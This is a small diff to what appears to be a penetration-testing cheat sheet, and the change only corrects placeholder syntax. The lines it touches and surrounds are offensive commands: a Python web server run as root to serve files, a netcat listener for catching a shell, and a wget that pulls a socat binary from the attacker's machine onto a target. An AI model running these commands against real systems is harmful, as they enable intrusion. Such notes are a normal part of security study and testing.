@@ -26,7 +26,7 @@ sudo python3 -m http.server 80
 # Get a netcat shell
 sudo nc -lvnp <port> 
 # Download socat compiled binary to target machine
-wget \{local IP}/socat -O /tmp/socat
+wget \<local IP>/socat -O /tmp/socat
 ```
 
 ## Basic Webshell
